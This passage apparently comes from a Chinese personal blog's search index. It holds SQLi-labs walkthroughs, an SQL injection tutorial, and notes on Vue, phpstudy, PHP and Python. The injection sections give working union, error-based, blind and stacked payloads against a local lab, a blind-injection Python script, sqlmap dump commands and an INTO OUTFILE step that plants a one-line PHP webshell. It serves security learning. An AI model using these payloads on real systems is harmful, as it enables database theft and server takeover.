(&#39;1&#39;)=(&#39;1 Less-28a 屏蔽了union select，空格，注释符。字符型闭合，闭合符为&#39;)。没有错误回显，使用布尔盲注。 http://192.168.2.48/sqli/Less-28a/?id=1&#39;) and %0aascii(substr(database(),1,1))=115%0a and(&#39;1&#39;)=(&#39;1 使用python脚本 import requests session = requests.Session() url = &#39;http://192.168.2.48/sqli/Less-28a/?id=0&#39; def db_2(): name = &#39;&#39; for i in range(1, 15): start = 32 end = 127 mid = (start + end) // 2 while start &lt;= end: # 假设正确的成功条件是URL返回一个特定的字符串 payload = url + f&quot;&#39;)||ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;||(&#39;&quot; print(payload) # 如果你想看实际发送的payload，可以将这行取消注释 response = session.get(payload) if &#39;Your Login name&#39; in response.text: start = mid + 1 mid = (start + end) // 2 else: end = mid - 1 mid = (start + end) // 2 if start &gt; 127 or mid == 32: # 如果start大于ASCII字符的上限，则停止 break name += chr(start) # 最后找到ASCII字符应该是start或end，因为它们会汇合 print(name) db_2() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455- ![image-20231226161732306](https://raw.githubusercontent.com/guangfa29/123/main/img/202312261617332.png)# Less-29- http参数污染。`?id=1&amp;&amp;id=2`在不同情况下有不同取法。- ![image.png](https://raw.githubusercontent.com/guangfa29/123/main/img/202312261645550.png)- 字符型闭合，闭合符为`&#x27;`，直接使用联合查询即可。- `http://192.168.2.48/sqli/Less-29/?id=1&amp;&amp;id=0&#x27; union select 1,3,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;-- - `- ![image-20231226164620704](sqli_labs.assets/image-20231226164620704.png)# Less-30- http参数污染，字符型闭合，闭合符为`&quot;`，联合查询。- `http://192.168.2.48/sqli/Less-30/?id=1&amp;&amp;id=0&quot; union select 1,2,database()-- -`- ![image-20231226165136437](sqli_labs.assets/image-20231226165136437.png)# Less-31- http参数污染，字符型闭合，闭合符为`&quot;)`，联合查询。- `http://192.168.2.48/sqli/Less-31/?id=1&amp;&amp;id=0&quot;) union select 1,2,database()-- -·`- ![image-20231226165426563](https://raw.githubusercontent.com/guangfa29/123/main/img/202312261654428.png)# Less-32- 宽字节注入，字符型闭合，闭合符为`&#x27;`。在闭合符前面加上`%df`。直接联合注入。- `http://192.168.2.48/sqli/Less-32/?id=0%df&#x27; union select 1,2,database() -- -`- ![image-20231226193339732](sqli_labs.assets/image-20231226193339732.png)# Less-33- 宽字节注入，字符型闭合，闭合符为`&#x27;`。`&#x27;1&#x27;=&#x27;2&#x27;`有报错显示，使用**报错注入**。- `http://192.168.2.48/sqli/Less-33/?id=1%df&#x27; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))-- -`- ![image-20231226193748085](sqli_labs.assets/image-20231226193748085.png)# Less-34- POST型宽字节注入，字符型闭合，闭合符为`&#x27;`。用yakit抓包，报错回显是张图片，直接联合查询`union select 1,2`- ``` POST /sqli/Less-34/ HTTP/1.1 Host: 192.168.2.48 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://192.168.2.48/sqli/Less-34/ Accept-Language: zh-CN,zh;q=0.9 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Origin: http://192.168.2.48 Content-Length: 40 uname=admin1%df&#x27; union select 1,2-- -&amp;passwd=admin1&amp;submit=Submit post方式下会对所有能编码的字符串全部编码，将%编码成%25，所以需要提前将%df解码，再输入进去。 0�&#39; union select 1,database()-- - Less-35 宽字节注入，数字型闭合。直接使用联合查询，但是在查询列名的时候，需要将查询的数据表名转换为十六进制,然后在前面加上0x。如： users--&gt;7573657273, table_name=0x7573657273 http://192.168.2.48/sqli/Less-35/?id=0 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273-- - Less-36 宽字节注入，字符型闭合，闭合符为&#39;。直接使用联合查询。 http://192.168.2.48/sqli/Less-36/?id=0%df&#39; union select 1,2,database()-- - Less-37 POST型宽字节注入，字符型闭合，闭合符为&#39;。 0�&#39; union select 1,database() Less-38 堆叠注入。 mysqli_multi_query($con1, $sql) //支持多条sql语句同时执行，由；分隔，成堆的执行sql语句。字符型闭合，符合符为&#39;。 http://192.168.2.48/sqli/Less-38/?id=1&#39; ;INSERT INTO users(id,username,password) VALUES (20,20,20)-- - 以此向users表注入一行数据。 Less-39 堆叠注入，数字型闭合。 http://192.168.2.48/sqli/Less-39/?id=1 ;INSERT INTO users(id,username,password) VALUES (30,30,30)-- - Less-40index.php 堆叠注入，字符型闭合，闭合符为&#39;)。 http://192.168.2.48/sqli/Less-40/?id=1&#39;) ;INSERT INTO users(id,username,password) VALUES (40,40,40)-- - new_user.php跳转Less-24 Less-41 堆叠注入，数字型闭合。 http://192.168.2.64/sqli/Less-41/?id=0 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;;INSERT INTO users(id,username,password) VALUES (50,50,50)-- - Less-42 POST型宽字节注入+堆叠注入，字符型闭合，闭合符为&#39;。","path":"2023/12/25/sqli_labs/","date":"12-25","excerpt":"","tags":[]},{"title":"SQL注入","text":"一、windows靶场搭建 在phpstudy安装mqsql5.7.26,php安装5.5.9 在网站–&gt;管理–&gt;php版本中更换至5.5.9版本 将sqli文件夹放入WWW根目录下 找到mysql5.7.26文件夹，bin目录下cmd进入,初始化数据库 12345输入 mysql.exe -u root -p （Windows可不输入.exe,默认自带）输入密码 root输入 use mysql输入 update user set Host=&#x27;%&#x27; where User=&#x27;root&#x27;输入 flush privileges 在phpstudy上开启apache、mysql服务，可通过本机的ip地址访问，进入靶场。 二、sql的三种注释方式 单行注释 -- 采用双减号进行单行注释，注意：双减号要用空格隔开才会生效 # 进行单行注释，不需要加空格就能生效 多行注释 /*……*/ 进行多行注释，前一个至后一个的内容为注释 三、UNION注入 使用group_concat()会将结果集中输出在一行 查询数据库中的数据表名 1union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database(); 查询表中的列名 12union select 1,group_concat(column_name),…… from information_schema.columns where table_name=&#x27;#要查询的表名#&#x27;and table_schema=database(); 查询每一列的数据 12union select 1,group_concat(#列1#,&quot; &quot;,#列2#,……) from #要查询的表名# 在mysql5.0版本之后在数据库中新增了两个库information schema,performance schema。(考点) 总结 确定数字型还是字符型 字符型需要判断闭合方式，数字型则不需要 1234id=1 #有输出结果id=2 #有输出结果id=2-1 #有输出结果如果id=1 和 id=2-1的输出结果一样则是数字型，因为字符串中不会进行-运算 输入&#39; 判断是否存在注入点，如果报错则存在注入点。 使用order by/group by的二分法判断union语句中前一个查询的列数 ?id=1 order by x --+ #不断更改x，直到有正常输出结果确定有多数列数 优化语句，将id改为一个不存在的数字 ?id=0 or -x union select 1,2,3 #id=0是为了让回显只显示我们想要的结果 为了看哪一个有回显 使用select语句，查询靶机数据库库名 ?id=0 union select 1,database(),version() --+ #查看当前数据库和mysql版本号 使用select语句，查询靶机所有表名 ?id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+ 或者?id=0 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3--+ 使用select语句，查询靶机所有列名 ?id=0 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+ 查询所有用户名密码 ?id=0 union select 1,group_concat(username,password),2 from users --+ 四、报错注入 报错语句 (extractvalue(1,concat(0x7e,(select user()),0x7e))) (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) (updatexml(1,concat(0x7e,(select user()),0x7e),1)) geometrycollection((select * from(select * from(select user())a)b)) multipoint((select * from(select * from(select user())a)b)) polygon((select * from(select * from(select user())a)b)) multipolygon((select * from(select * from(select user())a)b)) linestring((select * from(select * from(select user())a)b)) multilinestring((select * from(select * from(select user())a)b)) exp(~(select * from(select user())a)) 显示64个字符 将其中的select user()或者user() 替换为 (查询语句) 报错注入使用的前提 后台对于输入输出的合理性没有做检查，就会存在报错注入的基础。 当页面有回显(报错信息)，才使用报错回显。 五、布尔盲注 盲注：页面没有报错回显，不知道数据库具体返回值的情况下，对数据库中的内容进行猜解，实现SQL注入 盲注分类：布尔盲注，时间盲注，报错盲注 布尔盲注：web页面只返回True真，False假两种类型。利用页面返回不同，逐个进行猜解数据。 函数ascii()：把字母转换成ascii表中对应的数字 使用ascii()把查询到的内容转换成数字，以真假页面来判断字母和s对应的数字是否正确 12345?id=1&#x27; and ascii(&#x27;e&#x27;)=101 --+#条件满足，页面显示为真true?id=1&#x27; and ascii(&#x27;e&#x27;)=102 --+#条件不满足，页面显示为假falseselect ascii((select database())) #只能显示一个字符转换成的数字 函数substr((),1,1)：从第1个字符开始，显示1个字符 select ascii(substr((select database()),1,1)); 将select database()替换为想要查询的语句即可 id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+ #查询表名 此处没有必要使用group_concat()函数，而是使用limit 0,1，从第0行开始显示1行，从结果的第一行数据依次查询。 布尔盲注闭合符的判断 当加入注释符和不加入注释符都为真时，则可以排除此次输入的闭合符，如 排除双引号&quot;： ?id=1&quot; ---&gt;页面为真 and ?id=1&quot;--+ ---&gt;页面为真 六、时间盲注 时间盲注：web页面只返回一个正常页面，利用页面响应时间不同，组个猜解数据。前提是数据库会执行命令代码，只是不反馈页面信息。 函数sleep()：参数为休眠时长，以秒为单位，可以是小数。在使用函数sleep()并成功返回值后可在网络-耗时中查看响应时长。 ?id=1&#39; and sleep(3) --+ 函数if(condition,true,false) condition为条件，true当条件为真返回的值，false当条件为假返回的值 例如，1&#x3D;1为真，执行休眠0秒： select if(1=1,sleep(0),sleep(3)); 使用if()函数查询数据库 id=1&#39; and if(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3)); 先执行查询当前数据库命令，再由substr()控制从第一个开始，一次输出一个，每输出一个字符，通过ascii()将字符转化成数字，然后将这个数字与100进行比较，由if()进行判断是否为真，返回值为sleep()函数。 将select database()替换为查询语句即可进行查询，获得想要的内容。 时间盲注闭合符判断 12345?id=1 and sleep(2)--+?id=1&#x27; and sleep(2)--+?id=1&#x27;) and sleep(2)--+?id=1&quot; and sleep(2)--+#一个个试，能成功进行两秒钟响应的就是它的闭合方式 七、sqlmap打开虚拟机kali,进入命令行模式 1234567891. sqlmap --version 查看版本2. sqlmap -h 查看帮助3. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; 查询是否存在注入点4. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; --dbs 查看数据库5. --batch 默认选择6. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; --current-db 查看web当前使用的数据库6. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; --tables -D &quot;security(指定数据库名)&quot; 查看指定数据库中的表名7. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; --columns -T &quot;users(指定表名)&quot; -D &quot;security&quot; 查看数据库中的字段8. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; --dump -C &quot;id,username,password&quot; -T &quot;users&quot; -D &quot;security&quot; 查看指定的字段数据内容 八、宽字节注入 函数addslashes() 在指定的预定字符前添加反斜杠。这些字符是单引号，双引号，反斜线和NULL字符。 GBK编码 Mysql在使用GBK编码的时候，会认为两个字符为一个汉字，所以可以使用一些字符，和经过转义过后多出来的\\组合成两个字符，变成Mysql数据库不识别的汉字字符，导致对单引号、双引号的转义失败，使其闭合。 字符\\的ASCII码为92(URL编码:%5c)，在其前面输入%df&#39;(编码位为223),这样%df%5c符合GBK的取值范围(第一个字节为129-254，第二个字节64-254)，会解析为一个汉字，使得\\失去作用。 前提：要求对方Mysql数据库的编码方式是GBK编码，并且发请求时声明客户端用的也是GBK编码。 mysqli_query($con,&quot;SET NAMES gbk&quot;)&#39; 对于post方式传参，需要提前将%df进行解码再输入，因为会将%编码为%25。 九、堆叠注入 堆叠注入。 mysqli_multi_query($con1, $sql) //支持多条sql语句同时执行，由；分隔，成堆的执行sql语句。 在$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;闭合处进行对数据库的增删改查操作。(前提是有权限) 十、文件上传指令 show variable like &#39;%secure%&#39;;用来查看mysql是否有读写文件权限 数据库的file权限规定了数据库用户是否有权限，向操作系统内写入和读取已存在的权限 into outfile命令使用的环境：必须知道一个，服务器上可以写入文件的文件夹的完整路径 ?id=-1&#39;)) union select 1,&quot;&lt;?php @eva($_post[&#39;password&#39;]);?&gt;&quot;,3 into outfile &quot;D:\\\\phpstudy_pro\\\\WWW\\\\123.php&quot; -- - 其中 &lt;?php @eva($_post[&#39;password&#39;]);?&gt;为一句话木马 password为预留密码 D:\\\\phpstudy_pro\\\\WWW\\\\123.php为文件路径 123.php为新插入的文件名","path":"2023/12/20/SQL_ZhuRu/","date":"12-20","excerpt":"","tags":[]},{"title":"vue导入","text":"一、vue2.0 Windows安装node.js，官网下载 获取nodejs模块安装目录访问权限 sudo chmod -R 777 /usr/local/lib/node_modules/ 安装镜像 npm官方原始镜像网址是： https://registry.npmjs.org/ npm config set registry https://registry.npmjs.org/ 使用 cnpm 命令来安装模块 cnpm install [name] 安装webpack cnpm install webpack -g 安装vue脚手架 npm install vue-cli -g 找一个文件夹放工程，在终端中进入该目录 cd 目录路径 根据模板创建目录 123vue init webpack-simple 工程名字&lt;工程名字不能用中文&gt;或者创建 vue1.0 的项目vue init webpack-simple#1.0 工程名字&lt;工程名字不能用中文&gt; 会有一些初始化的设置 12345Target directory exists. Continue? (Y/n)Project name (vue-test)Project description (A Vue.js project) #以上建议直接回车默认Author #写自己的名字 cd命令进入创建的工程 安装项目依赖，建议从官方仓库安装，因为npm服务器在国外这一步会比较慢 123npm installcnpm install #不建议从国内镜像cnpm安装cnpm install vue-router vue-resource --save #安装vue路由模块和网络请求模块 启动项目 npm run dev 二、vue3npm安装 npm版本需要大于3.0，如果版本低于此版本需要升级它。 123456789# 查看版本$ npm -v2.3.0#升级 npmcnpm install npm -g# 升级或安装 cnpmnpm install cnpm -g 最新稳定版，这一指令将会安装并执行 create-vue，它是 Vue 官方的项目脚手架工具。如果不确定是否要开启某个功能，你可以直接按下回车键选择 No。 1234567891011121314151617181920212223$ npm init vue@latestNeed to install the following packages: create-vue@3.6.1Ok to proceed? (y) yVue.js - The Progressive JavaScript Framework# 这里需要进行一些配置，项目名输入 runoob-vue3-test，其他默认回车即可&amp;#x2714; Project name: … runoob-vue3-test&amp;#x2714; Add TypeScript? … No / Yes&amp;#x2714; Add JSX Support? … No / Yes&amp;#x2714; Add Vue Router for Single Page Application development? … No / Yes&amp;#x2714; Add Pinia for state management? … No / Yes&amp;#x2714; Add Vitest for Unit Testing? … No / Yes&amp;#x2714; Add an End-to-End Testing Solution? › No&amp;#x2714; Add ESLint for code quality? … No / YesScaffolding project in /Users/tianqixin/runoob-test/runoob-vue3/runoob-vue3-test...Done. Now run: cd runoob-vue3-test npm install npm run dev 在项目被创建后，通过以下步骤安装依赖并启动开发服务器： 12345678$ cd runoob-vue3-test$ npm install$ npm run dev VITE v4.3.4 ready in 543 ms ➜ Local: http://localhost:5173/ ➜ Network: use --host to expose ➜ press h to show help 成功执行以上命令后访问 http://localhost:5173/","path":"2023/12/17/vue/","date":"12-17","excerpt":"","tags":[]},{"title":"phpstudy的mysql服务开启","text":"需下载phpstudy和Navicat软件 进入192.168.2.6:5244下载 开启apache和mysql服务 3.打开navicat软件，连接本地 在phpstudy中找到根目录打开，找到mysql文件下的bin目录，cmd进入 开启mysql 输入mysql.exe -u root -p （Windows可不输入.exe,默认自带） 输入密码 root 输入use mysql 输入update user set Host&#x3D;’%’ where User&#x3D;’root’ 输入flush privileges","path":"2023/12/17/phpstudy_mysql/","date":"12-17","excerpt":"","tags":[]},{"title":"php的一些基础知识","text":"打开php，在网站设置的高级配置中国打开目录索引。 GET方式获取用户输入信息 123在index.php下输入：$a = $_GET[&#x27;a&#x27;];echo = $a; 经典问题（1）鸡兔同笼：假设在笼子里有头数为8的动物，总共有22只脚。（2）n张5毛，y张1块，z张10块，t张50，x张100，问我手上一共有156钱，一共有多少种组合，满足我手上的钱。 使用if循环和嵌套。 mysqli_query()函数 定义：mysqli_query()函数执行一条Mysql查询 语法：mysqli_query(query,connection) 参数：query:必需，规定要发送的SQL查询。 ​ connection:可选，规定SQL连接标识符。 说明：如果没有打开的连接，本函数会尝试无参数调用mysqli_query()函数来建立一个连接并使用之。 返回值：mysql_query()仅对SELECT，SHOW，EXPLAIN或DESCRIBE语句返回一个资源标识符，如果查询执行不正确则返回FALSE。 对于其它类型的SQL语句，mysql_query()在执行成功时返回TRUE，出错时返回FALSE。 非FALSE的返回值意味着查询是合法的并能够被服务器执行。这并不说明任何有关影响到的或返回的行数。很有可能一条查 询执行成功了但并未影响到或并未返回任何行。 mysqli_fetch_assoc()函数 定义：mysqli_fetch_assoc()函数从结果集中取得一行作为关联数组。该函数返回的字段区分大小写。 语法：mysqli_fetch_assoc(result); 参数：result:必需，规定由mysqli_query()、mysqli_store_result()或mysqli_use_result()返回的结果集标识符。 Insert Into 定义：INSERT INTO语句用于向数据库表中添加新纪录。 语法：INSERT INTO table_name(column1,column2,……) VALUES (value1,value2，……) 注释：SQL语句对大小写不敏感。INSERT INTO 与insert into相同。 while循环中使用mysqli_fetch_assoc()? &lt;form&gt;enctype属性 定义：enctype属性规定在将表单数据发送到服务器之前如何对其进行编码。注意：只有method=&quot;post时才能使用enctype属性。 语法：&lt;form enctype=&quot;value&quot;","path":"2023/12/17/php_study/","date":"12-17","excerpt":"","tags":[]},{"title":"python_study","text":"第一章一、变量 变量：可以发生改变的一个量，变量是用来区分不同数据的，可以指向一个内存空间，帮我们储存一些数据 变量的命名规范 必须是数字或字母或下划线组成 不能数字开头，也不能是纯数字 不要能用python的关键字 不能用中文 不要太长 要有意义 推荐使用下划线命名或驼峰命名 name_of_teacher = &quot;樵夫&quot; NameOfTeacher = &quot;樵夫&quot; 二、常量 print(123) 可以把所有变量的字母变成大写就可以认为是常量 不存在绝对意义上的常量 三、数据类型 数据类型：区分不同的数据，不同数据类型应该有不同的操作 数字: +-* 整数：int 小数：float 文字： 展示 字符串：str(****) 表示方式：&#39;***&#39; ,&quot;****&quot;,&#39;&#39;&#39;***&#39;&#39;&#39; (英文状态下) 操作： + 左右两端必须是字符串，表示字符串两端连接操作 * 一个字符串只能乘以一个数字，表示字符串重复的次数 布尔(bool)：条件判断 布尔值主要有两个： True 真 False 假 四、最简单的用户交互 变量 = input(提示语) 首先会在屏幕中显示出提示语，用户输入内容，然后把用户输入的内容交给前面的变量 注意 ：input()得到的结果一定是字符串 py基础数据类型转化（想把xxx转化为谁，就用谁套起来） str → int : int(str) 内置函数type()可查看数据类型 五、条件判断(一)、if语句if语句的语法规则： 1234if 条件 ： 代码#如果条件成立就执行代码；如果不成立，就不执行#无论执行或不执行，都会进行这个循环之后的语句 12345if 条件 ： 代码1else : 代码2#如果条件一成立，执行代码1；如果条件二成立，执行代码2 1234567891011#if语句相互嵌套if 条件1 ： if 条件2 ……(可无线嵌套if) 代码1 else : 代码2 ……（else 代码i） else : 代码n 12345678if 条件 : 代码1elseif 条件2： 代码2……（elseif 条件i ： 代码i）else : 条件n (二)、while循环语句 while循环语句 1234#可以让我们的代码重复去执行while 条件 : 代码#过程：判断条件是否为真，如果是真，执行代码；然后再次判断条件，……直到条件为假循环结束 break和continue break :让当前循环立即停止，继续循环之后的语句（当某个数据会影响到最终结果时使用） continue :停止当前本次循环，继续执行下一次循环（一般用于处理无效数据） (三)、for循环语句123456#字符串是可迭代的for 变量 in 可迭代的东西 : 代码#把可迭代的东西中的每一项内容拿出来，挨个赋值给变量，每一次赋值都要执行一个循环体（代码）#平时用的多的是for循环，while循环用的多的是死循环while Ture： 搭配内置函数range() 123range(n) #从0数到n,不包含nrange(m,n) #从m数到n，不包含n（默认间隔为1）range(m,n,s) #从m数到n，每次间隔为s，不包含n (四)、pass关键字pass #代码占位,为了代码完整性防止报错，暂时先过掉 第二章一、基础数据类型 整数类型：int 操作：加减乘除，大小比较 浮点数：float 小数：数据范围是无限的，而计算机是一个二进制产品：0，1。所以计算机表示一个小数是会有误差的 bool 用来做条件判断的 取值范围：True(1),False(0) 在python中，所有非零数字都是True,零是False while 1 : #死循环，恒为真 在python中，所有的非空字符串都是True,空字符串都是False 综上，在python中所有表示空的东西都是Fasle,非空的东西都是True。 二、字符串（一）、字符串的格式化123456%s #字符串占位。也可以是小数，整数（万能）%d #整数占位#使用格式1. s=&quot;%s，%d……&quot;% (变量1，变量2，……) #只有一个变量，后面的括号可以不加2. s=&quot;&#123;&#125;，&#123;&#125;，……&quot;.format(变量1，变量2，……)3. s=f&quot;&#123;变量1&#125;，&#123;变量2&#125;，……&quot; （二）、字符串的索引和切片 *** 索引：按照位置提取元素 123s = &quot;我叫xyz&quot;print(s[1]) #会输出：叫 ---从0开始数数print(s[-1]) #会输出： z ---负号表示倒数，最后一个就是-1 切片：从一个字符串中提取一部分内容 语法：s[start:end] 从start到end进行切片，但是不取end，前开后闭区间，若要取最后一个元素，end处需输入n+1（n为元素个数） start从0开始，end从0结尾都可以不写0 可以给切片添加步长来控制切片的方向s[start:end:-1],从右往左取(右开左闭区间），不写就默认取1，从左往右取（左开右闭区间）。 步长设为i&gt;0（&lt;0),在切下来的片段下从左往右(从右往左）开始，每i个取左边（右边）第一个 12345678s = &quot;我叫xyzabc&quot;print(s[3:6]) #会输出：yza ---从索引3开始切片，到6结束，不会取第六个元素print(s[:6]) #从第0个到第6个print(s[3:]) #从第3个到最后一个，且包括最后一个print(s[-3:-1]) #会输出：abprint(s[-1:-3]) #没结果print(s[-1:-3:-1]) #会输出：cbprint(s[-1:-6:-2]) #会输出：cay (三)、字符串的常规操作 字符串的操作一般不会对原字符串产生影响，一般是返回一个新的字符串 字符串的大小写转换 1234567891011s = &quot;i have a dream&quot;#对第一个字母大写s1 = s.capitalize() # I have a dream#单词的首字母大写，电脑只能对一段连续的英文字母识别为单词s2 = s.title() # I Have A Dream#把所有字母改成大写字母（用于忽略大小写判断）s3 = s.upper() # I HAVE A DREAMn = &quot;I HAVE A DREAM&quot;#把所有字母变成小写n1 = n.lower() # i have a dream （四）、字符串的切割和替换 字符串strip() strip()去掉字符串左右两端的空白符（空格,\\t,\\n）。一般用于账户登录，避免用户在两端打出空格无法分辨 123s = &quot; 你好！ 我已经躲起 来了 &quot;s1 = s.strip()print(s1) #会输出：你好！ 我已经躲起来 来了 字符串的替换replace(old,mew) 1234567s = &quot;你好啊，我叫abc&quot;s1 = s.repalce(abc,xyz)print(s1) #输出：你好啊，我叫xyz#去掉所有空格a = &quot; x x xx x &quot;a1 = a.replace(&quot; &quot;,&quot;&quot;)print(a1) #输出：xxxxx 字符串的切割 split(str) 字符串切割 12345a = &quot;python_java_c_c#_javascript&quot;lst = a.split(_) #切割之后的结果会放在列表当中print(lst) #输出：[&#x27;python&#x27;,&quot;java&quot;,&#x27;c&#x27;,&#x27;c#&#x27;,&#x27;javascript&#x27;]lst = a.split(&quot;_java_&quot;)print(lst) #输出：[&#x27;python&#x27;,&#x27;c_c#_javascript&#x27;] （五）字符串的查找和判断 查找 find(str,beg&#x3D;0，end&#x3D;len(string)) 只查找第一次出现的位置 str–指定索引字符串 beg–开始索引，默认为0 end–结束索引，默认为字符串长度 如果包含子字符串返回开始的索引值，否则返回-1,即不包含寻找的str字符串 123s = &quot;你好啊，我叫周润发&quot;ret = s.find(&quot;周润发&quot;)print(ret) 判断 in用于该字符串是否存在（以及for循环的条件判断） * (返回值为 ture or false) 12s = &quot;你好啊，我叫周润发&quot;print(&quot;周润发111&quot; in s) startswith()用于判断字符串是否以xxx开头 * endswith()用于判断字符串是否以xxx结尾 isdight()用于判断字符串是否由整数组成 * （六）、字符串补充与总结 字符串拼接-join() 123lst = [&quot;123&quot;,&quot;456&quot;,&quot;789&quot;]s = &quot;_&quot;join(lst) print(s) #输出：123_456_789（输出的s是字符串类型） 总结 f“{变量}” 格式化一个字符串 索引和切片： 索引：从0开始的 [] 切片：s[start:end:step] end位置数据永远取不到 相关操作： 字符串操作对原字符串是不发生改变的 1. `upper()`在需要忽略大小写的时候 2. `strip()`去掉字符串左右两端的空白（空格，\\t,\\n） 3. `replace(old,new)` 字符串替换 4. `split()` 对字符串进行切割 5. `&quot;(用什么拼接)&quot;join(列表)` 拼接一个列表中的内容成为新字符串 6. `startswith(xxx)` 判断字符串是否以xxx开头 7. `len()` 字符串长度（内置函数） 字符串的循环和遍历 12for c in s: print(c) 字符串的每一个字符 关于in 1. 判断xxx是否在xxxxxx中出现 2. for循环 三、列表（一）、列表的概念 定义：能装东西的东西(什么都能装，字符串、列表、字典、元组等) 在python中用[]来表示一个列表 特性： 也像字符串一样有索引和切片 12lst = [&#x27;123&#x27;,&#x27;zzz&#x27;,123] print(lst[]) 索引如果超过范围会报错 可以用for循环进行遍历 12for item in lst: print(item) （二）、列表的增删改查 增 append() 追加（在末尾添加，只能添加一个元素） insert() 插入 extend() 可以合并两个列表 删除 pop() 给出被删除的索引，返回被删除的元素 remove() 删除某个元素 修改 直接用索引进行修改 lst[x] = &quot;xx&quot; 查询 直接用索引进行查询操作 print(lst[x]) （三）、列表的其他操作（补充）1. 排序1234lst = [1,2,3,&quot;麻花騰&quot;，“武大郎] #列表会按照存放的顺序来保存lst.sort() #对列表进行升序排序lst.sort(reverse=True) #reserve:翻转print(lst) #会输出：[&quot;武大郎&quot;，&quot;麻花腾&quot;，3，2，1] 2. 列表的嵌套12lst = [&quot;123&quot;,&quot;abc&quot;,[&quot;coke&quot;,[&quot;呼吸&quot;]],&quot;zzz&quot;]print(lst[2][1][0]) #会输出 &quot;呼吸&quot; 3.列表的循环删除（*） 四、元组 元组：t = (&quot;张无忌&quot;,&quot;赵敏&quot;,&quot;123&quot;) 特点：元组是不可变的列表（内存地址不能变） ‘tuple’ object dose not support item asssignment 元组如果只有一个元素，由于括号的优先级，会被认为字符串，需要在元素的末尾添加一个逗号 五、set集合 s &#x3D; {} 里面不放东西时，会被认为是字典类型 set集合没有顺序，所以没有索引和切片 set集合要求存储的数据必须是可以进行哈希计算的 python中的set集合进行数据存储的时候，需要对数据进行哈希巨酸，根据计算出来的哈希值进行存储数据 不可哈希：可变的数据类型，list,dict,set 可哈希：不可变的类型，int,str,tuple,bool 创建空集合（列表、元组、字符串） 集合的添加s.add() 集合的删除s.pop()默认删除最后一个， 由于集合的无序，从结果上来说任意一个都可能会被删除，很少用 s.remove(&quot;xxx&quot;)指定删除某一个内容 集合的修改，由于没有顺序，所以要先删除再新增 s.remove(&quot;xxx&quot;) s.add(&quot;xxxx&quot;) 集合的查找 利用for循环 交集(&amp;)、并集(|)、差集(-)，集合的元素不允许重复 作用：可以去重复 123456789s1 = &#123;&quot;x&quot;,&quot;xx&quot;,&quot;zzz&quot;&#125;s2 = &#123;&quot;y&quot;,&quot;yy&quot;,&quot;zzz&quot;&#125;print(s1 &amp; s2) or print(s1.intersection(s2)) #交集 &#123;&quot;zzz&quot;&#125;print(s1 | s2) or print(s1.union(s2)) #并集 &#123;&quot;x&quot;,&quot;xx&quot;,&quot;y&quot;,&quot;yy&quot;,&quot;zzz&quot;&#125;print(s1-s2) or print(s1.difference(s2))# 差集 &#123;&quot;x&quot;,&quot;xx&quot;&#125;lst = [&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;xx&quot;,&quot;xx&quot;,&quot;zzz&quot;&quot;zzz&quot;&quot;zzz&quot;&quot;zzz&quot;]print(list(set(lst))) #会输出[&quot;x&quot;,&quot;zzz&quot;&quot;xx&quot;], # 通过这个方法输出的列表顺序和原来的不一样，因为集合是无序输出的 六、字典(一)、字典的概念 存储方式是以键值对的形式进行存储的，取值时根据键来取值 表示方式dic = &#123;key:value,key2:value,key3;valuse&#125; 用起来只是把索引改成了key val = dic[key] 字典的键key必须是可哈希的（不可变），value值可以是任意类型数据 (二)、字典的增删改查 字典的添加和修改 dic[key] = value dic.setdefault (键，值) #键和值为字符串的话需要用双引号括起来 添加的键值对会在字典的末尾加入。 setdefault执行的操作是设置默认值，如果字典里已经有了要设置的键，setdefault就不起作用了。 字典的每个key都是唯一的，如果要添加的键值对的键包含在字典里面，则执行覆盖操作。 字典的删除 dic.pop(键key) 根据key去删除键值对 字典的查询 dic[键key] #如果key不存在，程序会报错。当确定key是没问题的，可以用 dic.get(键key) #如果key不存在，程序会返回None。当不确定key的时候，可以用 （三）、字典的循环和嵌套循环 可以用for循环，直接拿到key 12345678910dic = &#123; key1 : value1, key2 : value2, ……&#125;for key in dic: print(key,dic[key])#会输出 key1 value1 key2 value2 …… 将所有拿到的key全都保存在一个列表当中 123for key in dic: print(list(dic.keys()))#会输出 [key1,key2,……] 将所有拿到的value全都保存在一个列表当中 123for key in dic: print(list(dic.values()))#会输出 [value1,value2,……] 直接拿到字典里的key和value for key in dic: print(dic.items())#会输出 dict_items([(‘赵四’, ‘特别能歪嘴’), (‘刘能’, ‘老，老四啊。。’), (‘大脚’, ‘跟这个搞对象’), (‘大脑袋’, ‘瞎折腾….’)]) for item in dic.items(): print(item) #会输出： (&#39;赵四&#39;, &#39;特别能歪嘴&#39;) (&#39;刘能&#39;, &#39;老，老四啊。。&#39;) (&#39;大脚&#39;, &#39;跟这个搞对象&#39;) (&#39;大脑袋&#39;, 